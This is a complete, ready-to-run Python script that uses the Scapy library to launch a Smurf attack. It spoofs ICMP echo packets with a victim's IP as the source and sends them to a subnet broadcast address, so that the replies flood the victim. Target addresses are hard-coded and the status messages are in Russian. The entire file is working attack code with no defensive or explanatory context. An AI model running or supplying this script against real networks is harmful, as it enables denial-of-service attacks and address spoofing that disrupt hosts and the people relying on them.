import time

from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send


def smurf_attack(victim_ip, broadcast_ip, counter=100):
    packet = IP(src=victim_ip, dst=broadcast_ip) / ICMP()

    print(f"Смурф-атака на {victim_ip} через {broadcast_ip}")

    for i in range(counter):
        send(packet, verbose=0)
        time.sleep(0.01)

    print(f"Отправлено {counter} пакетов.")


broadcast_ip = "192.168.0.255"
victim_ip = "192.168.0.156"

smurf_attack(victim_ip, broadcast_ip)
